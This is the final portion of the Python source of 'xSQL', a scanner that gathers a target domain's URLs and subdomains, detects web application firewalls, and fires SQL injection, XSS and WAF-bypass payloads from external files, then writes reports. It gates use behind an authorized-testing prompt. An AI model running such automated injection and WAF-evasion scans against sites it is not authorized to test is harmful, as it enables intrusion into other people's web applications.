            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #4CAF50; color: white; }}
            tr:nth-child(even) {{ background-color: #f2f2f2; }}
            tr:hover {{ background-color: #ddd; }}
            a {{ color: #0066cc; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
        </style>
    </head>
    <body>
        <h1>xSQL Scan Report</h1>
        <p>Generated: {timestamp}</p>
        <h2>SQL Injection Vulnerabilities ({len(set(sqli_vulns) - waf_bypassed_urls)})</h2>
        <table>
            <tr><th>URL</th></tr>
            {"".join(f'<tr><td><a href="{v}" target="_blank">{v}</a></td></tr>' for v in sorted(set(sqli_vulns) - waf_bypassed_urls))}
        </table>
        <h2>XSS Vulnerabilities ({len(set(xss_vulns) - waf_bypassed_urls)})</h2>
        <table>
            <tr><th>URL</th></tr>
            {"".join(f'<tr><td><a href="{v}" target="_blank">{v}</a></td></tr>' for v in sorted(set(xss_vulns) - waf_bypassed_urls))}
        </table>
        <h2>WAF-Bypassed Vulnerabilities ({len(waf_bypassed)})</h2>
        <table>
            <tr><th>URL</th><th>Type</th><th>WAF Name</th><th>Manufacturer</th><th>Encoding</th></tr>
            {"".join(f'<tr><td><a href="{v[0]}" target="_blank">{v[0]}</a></td><td>{v[1][0]}</td><td>{v[1][1].get("waf_name", "Unknown")}</td><td>{v[1][1].get("manufacturer", "Unknown")}</td><td>{v[1][2]}</td></tr>' for v in sorted(waf_bypassed, key=lambda x: x[0]))}
        </table>
    </body>
    </html>
    """
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    console.print(f"[green][+] HTML report written to {output_file}[/green]")
    logging.info(f"HTML report written to {output_file}")

def save_results(sqli_vulns, xss_vulns, waf_bypassed, output_file):
    waf_bypassed_urls = set(v[0] for v in waf_bypassed)
    if sqli_vulns:
        with open(os.path.join(RESULTS_DIR, "sqli_vulnerable_urls.txt"), "w", encoding="utf-8") as f:
            for v in sorted(set(sqli_vulns) - waf_bypassed_urls):
                f.write(f"{v}\n")
    if xss_vulns:
        with open(os.path.join(RESULTS_DIR, "xss_vulnerable_urls.txt"), "w", encoding="utf-8") as f:
            for v in sorted(set(xss_vulns) - waf_bypassed_urls):
                f.write(f"{v}\n")
    if waf_bypassed:
        with open(os.path.join(RESULTS_DIR, "waf_bypassed_vulnerable_urls.txt"), "w", encoding="utf-8") as f:
            for v in sorted(waf_bypassed, key=lambda x: x[0]):
                f.write(f"[{v[1][0]}] {v[0]}: {{'waf_name': '{v[1][1].get('waf_name', 'Unknown')}', 'manufacturer': '{v[1][1].get('manufacturer', 'Unknown')}', 'encoding': '{v[1][2]}'}}\n")
    console.print(f"[green][+] Results saved to sqli_vulnerable_urls.txt, xss_vulnerable_urls.txt, waf_bypassed_vulnerable_urls.txt[/green]")
    logging.info(f"Results saved to sqli_vulnerable_urls.txt, xss_vulnerable_urls.txt, waf_bypassed_vulnerable_urls.txt")

# ---------------- MAIN ----------------
def main():
    print_banner()
    parser = argparse.ArgumentParser(description="xSQL — Advanced Recon + SQLi/XSS Scanner")
    parser.add_argument("-d", "--domain", action="append", required=True, help="Target domain (use multiple -d for multiple domains)")
    parser.add_argument("--subdomains", action="store_true", help="Enable subdomain enumeration")
    parser.add_argument("--skip-subdomains", action="store_true", help="Skip subdomain enumeration")
    parser.add_argument("--live", action="store_true", help="Filter live URLs/subdomains with httpx")
    parser.add_argument("--threads", type=int, default=HTTPX_THREADS_DEFAULT, help=f"Threads for httpx filtering (default {HTTPX_THREADS_DEFAULT})")
    parser.add_argument("--test-threads", type=int, default=TESTING_THREADS_DEFAULT, help=f"Threads for SQLi/XSS testing (default {TESTING_THREADS_DEFAULT})")
    parser.add_argument("--status-codes", default="200,301,302", help="HTTP status codes for live filtering (default 200,301,302)")
    parser.add_argument("--delay", type=float, default=TESTING_DELAY_DEFAULT, help=f"Delay between requests in seconds (default {TESTING_DELAY_DEFAULT})")
    parser.add_argument("--timing", action="store_true", help="Enable timing-based (blind) SQLi detection")
    parser.add_argument("--timing-seconds", type=int, default=5, help="Time in seconds for timing-based SQLi test (default 5)")
    parser.add_argument("--proxy", help="HTTP proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--no-ssl-verify", action="store_false", dest="ssl_verify", help="Disable SSL verification (default enabled)")
    parser.add_argument("--sqli-payload-file", default=SQLI_PAYLOADS_FILE, help=f"SQLi payloads file (default {SQLI_PAYLOADS_FILE})")
    parser.add_argument("--xss-payload-file", default=XSS_PAYLOADS_FILE, help=f"XSS payloads file (default {XSS_PAYLOADS_FILE})")
    parser.add_argument("--waf-bypass-payload-file", default=WAF_BYPASS_PAYLOADS_FILE, help=f"WAF bypass payloads file (default {WAF_BYPASS_PAYLOADS_FILE})")
    parser.add_argument("--waf-test-percentage", type=float, default=100.0, help="Percentage of URLs to test for WAFs (default 100.0)")
    parser.add_argument("--extensions", default="php,asp,aspx,jsp,do,html,htm", help="Comma-separated file extensions to include (default php,asp,aspx,jsp,do,html,htm)")
    parser.add_argument("--test-sqli", action="store_true", help="Test for SQL Injection vulnerabilities")
    parser.add_argument("--test-xss", action="store_true", help="Test for XSS vulnerabilities")
    parser.add_argument("--test-both", action="store_true", help="Test for both SQLi and XSS vulnerabilities")
    parser.add_argument("--test-waf-urls", action="store_true", help="Test WAF-protected URLs with bypass techniques")
    parser.add_argument("--output", default=os.path.join(RESULTS_DIR, "vulnerable_urls.txt"), help=f"Vulnerable URLs output file (default {RESULTS_DIR}/vulnerable_urls.txt)")
    parser.add_argument("--html-report", default=os.path.join(RESULTS_DIR, "xsql_report.html"), help=f"HTML report filename (default {RESULTS_DIR}/xsql_report.html)")
    parser.add_argument("--resume", action="store_true", help="Resume scan from last checkpoint")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    args = parser.parse_args()

    setup_logging(args.debug)
    console.print("[yellow][!] This tool is for authorized security testing only.[/yellow]")
    response = input("Type 'I AGREE' to continue: ")
    if response != "I AGREE":
        logging.error("Agreement not confirmed. Exiting.")
        console.print("[red][-] Agreement not confirmed. Exiting.[/red]")
        sys.exit(1)

    for tool in REQUIRED_BASE_TOOLS:
        check_tool(tool)

    for d in args.domain:
        validate_domain(d)

    if not (args.test_sqli or args.test_xss or args.test_both):
        logging.error("No test mode specified (--test-sqli, --test-xss, or --test-both required)")
        console.print("[red][-] No test mode specified. Please use --test-sqli, --test-xss, or --test-both to specify a vulnerability testing mode.[/red]")
        sys.exit(1)

    do_test_sqli = args.test_sqli or args.test_both
    do_test_xss = args.test_xss or args.test_both

    if args.waf_test_percentage < 0 or args.waf_test_percentage > 100:
        logging.error("Invalid WAF test percentage")
        console.print(f"[red][-] Invalid --waf-test-percentage: {args.waf_test_percentage}. Must be between 0 and 100.[/red]")
        sys.exit(1)

    extensions = [ext.strip().lower() for ext in args.extensions.split(",") if ext.strip()]

    state = load_state() if args.resume else {}
    sqli_payloads = load_payloads(args.sqli_payload_file) if do_test_sqli else []
    xss_payloads = load_payloads(args.xss_payload_file) if do_test_xss else []
    waf_bypass_payloads = load_waf_bypass_payloads(args.waf_bypass_payload_file) if (do_test_sqli or do_test_xss) else []
    sqli_waf_payloads = [p for p in waf_bypass_payloads if any(s in p.lower() for s in ["union", "select", "sleep", "or ", "and ", "benchmark"]) or p.startswith(("'", '"', "1"))] if do_test_sqli else []
    xss_waf_payloads = [p for p in waf_bypass_payloads if any(s in p.lower() for s in ["<script>", "<img", "<svg", "javascript:", "onerror", "onload", "atob", "fromcharcode"])] if do_test_xss else []

    domains_to_query = list(dict.fromkeys([d.lower() for d in args.domain]))
    all_urls = state.get("all_urls", [])
    all_subdomains = state.get("all_subdomains", [])
    sqli_vulns = state.get("sqli_vulns", [])
    xss_vulns = state.get("xss_vulns", [])
    waf_bypassed = state.get("waf_bypassed", [])
    checkpoint = state.get("checkpoint", "start")

    if checkpoint == "start" or not args.resume:
        all_urls = []
        all_subdomains = []
        sqli_vulns = []
        xss_vulns = []
        waf_bypassed = []
        # Fetch historical URLs first
        waygau_urls = fetch_urls(domains_to_query, debug=args.debug, extensions=extensions)
        all_urls.extend(waygau_urls)
        save_state({
            "checkpoint": "urls_fetched",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })

    if args.skip_subdomains or not args.subdomains:
        console.print("[yellow][*] Skipping subdomain enumeration.[/yellow]")
        logging.info("Skipping subdomain enumeration")
    elif checkpoint in ["start", "urls_fetched"] or not args.resume:
        all_subdomains = []
        katana_urls = []
        for d in domains_to_query:
            subs, sub_urls = enumerate_subdomains(d, live_filter=args.live, httpx_threads=args.threads, httpx_status=args.status_codes, debug=args.debug)
            all_subdomains.extend(subs)
            katana_urls.extend(sub_urls)
        all_urls.extend(katana_urls)

        # Combine WayGauUrls.txt and KatanaSubsUrls.txt
        waygau_file = os.path.join(RESULTS_DIR, "WayGauUrls.txt")
        katana_file = os.path.join(RESULTS_DIR, "KatanaSubsUrls.txt")
        all_urls_file = os.path.join(RESULTS_DIR, "all_urls.txt")
        console.print(f"[cyan][*] Combining URLs from waybackurls, gau, and katana...[/cyan]")
        cmd = f"cat {shlex.quote(waygau_file)} {shlex.quote(katana_file)} | sort -u > {shlex.quote(all_urls_file)}"
        run_cmd(cmd, debug=args.debug)
        console.print(f"[green][+] Combined URLs into {all_urls_file}[/green]")
        logging.info(f"Combined URLs into {all_urls_file}")
        save_state({
            "checkpoint": "subdomains_enumerated",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })

    logging.debug(f"Domains to query: {len(domains_to_query)}")
    if args.debug:
        console.print(f"[yellow][DEBUG] Domains to query: {len(domains_to_query)}[/yellow]")

    if not all_urls:
        console.print("[yellow][!] No URLs fetched. Falling back to domains.[/yellow]")
        logging.warning("No URLs fetched. Falling back to domains.")
        all_urls = [f"https://{d}" for d in domains_to_query] + [f"http://{d}" for d in domains_to_query]
        save_state({
            "checkpoint": "subdomains_enumerated",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })

    allowed_domains = [d.lower() for d in args.domain]
    scoped_urls = [u for u in all_urls if any(domain_in_scope(u, ad) for ad in allowed_domains)]
    scoped_urls = sorted(set(scoped_urls))
    logging.debug(f"Scoped URLs: {len(scoped_urls):,}")
    if args.debug:
        console.print(f"[yellow][DEBUG] Scoped URLs: {len(scoped_urls):,}[/yellow]")

    if checkpoint in ["start", "urls_fetched", "subdomains_enumerated"] or not args.resume:
        live_urls = filter_live_urls(scoped_urls, threads=args.threads, status_codes=args.status_codes, debug=args.debug, subdomains=args.subdomains) if args.live else scoped_urls
        save_state({
            "checkpoint": "urls_filtered",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "live_urls": live_urls,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })
    else:
        live_urls = state.get("live_urls", scoped_urls)

    console.print(f"[magenta][*] URLs to test: {len(live_urls):,}[/magenta]")
    logging.info(f"URLs to test: {len(live_urls):,}")

    # Perform WAF detection once for all URLs to test
    waf_results = {}
    if do_test_sqli or do_test_xss:
        console.print(f"[bold magenta][*] Checking for WAFs on live URLs...[/bold magenta]")
        urls_to_test = live_urls[:min(200, len(live_urls))]
        waf_test_count = int(len(urls_to_test) * (args.waf_test_percentage / 100.0))
        waf_urls_to_test = random.sample(urls_to_test, waf_test_count) if waf_test_count < len(urls_to_test) else urls_to_test
        session = get_session(proxy=args.proxy, ssl_verify=args.ssl_verify)
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
            task = progress.add_task(f"Checking WAFs ({args.waf_test_percentage}% of URLs)", total=len(waf_urls_to_test))
            for url in waf_urls_to_test:
                waf_findings = detect_waf_wafw00f(url, session=session, debug=args.debug, test_type="sqli" if do_test_sqli else "xss")
                waf_results[url] = waf_findings
                progress.update(task, advance=1)
        # Fill waf_results with empty findings for untested URLs
        for url in urls_to_test:
            if url not in waf_results:
                waf_results[url] = {}

    waf_bypass_file = os.path.join(RESULTS_DIR, "waf_bypassed_vulnerable_urls.txt")
    if os.path.exists(waf_bypass_file):
        os.remove(waf_bypass_file)

    if do_test_sqli and (checkpoint in ["start", "urls_fetched", "subdomains_enumerated", "urls_filtered"] or not args.resume):
        sqli_vulns, sqli_waf_bypassed = test_sqli(
            live_urls, sqli_payloads, sqli_waf_payloads, USER_AGENTS, waf_results, proxy=args.proxy, threads=args.test_threads,
            delay=args.delay, timing=args.timing, timing_seconds=args.timing_seconds,
            ssl_verify=args.ssl_verify, debug=args.debug, test_waf_urls=args.test_waf_urls
        )
        waf_bypassed.extend(sqli_waf_bypassed)
        save_state({
            "checkpoint": "sqli_tested",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "live_urls": live_urls,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })

    if do_test_xss and (checkpoint in ["start", "urls_fetched", "subdomains_enumerated", "urls_filtered", "sqli_tested"] or not args.resume):
        xss_vulns, xss_waf_bypassed = test_xss(
            live_urls, xss_payloads, xss_waf_payloads, USER_AGENTS, waf_results, proxy=args.proxy, threads=args.test_threads,
            delay=args.delay, ssl_verify=args.ssl_verify, debug=args.debug, test_waf_urls=args.test_waf_urls
        )
        waf_bypassed.extend(xss_waf_bypassed)
        save_state({
            "checkpoint": "xss_tested",
            "domains": domains_to_query,
            "all_urls": all_urls,
            "all_subdomains": all_subdomains,
            "live_urls": live_urls,
            "sqli_vulns": sqli_vulns,
            "xss_vulns": xss_vulns,
            "waf_bypassed": waf_bypassed
        })

    total_vulns = len(set(sqli_vulns + xss_vulns))
    waf_bypassed_count = len(waf_bypassed)
    console.print(f"[green][+] Found {len(set(sqli_vulns) - set(v[0] for v in waf_bypassed)):,} SQLi, {len(set(xss_vulns) - set(v[0] for v in waf_bypassed)):,} XSS, and {waf_bypassed_count:,} WAF-bypassed vulnerable URLs.[/green]")

    save_results(sqli_vulns, xss_vulns, waf_bypassed, args.output)
    generate_html_report(sqli_vulns, xss_vulns, waf_bypassed, args.html_report)

    clear_state()
    console.print("[bold cyan][*] Scan completed.[/bold cyan]")
    logging.info("xSQL scan completed")

if __name__ == "__main__":
    main()
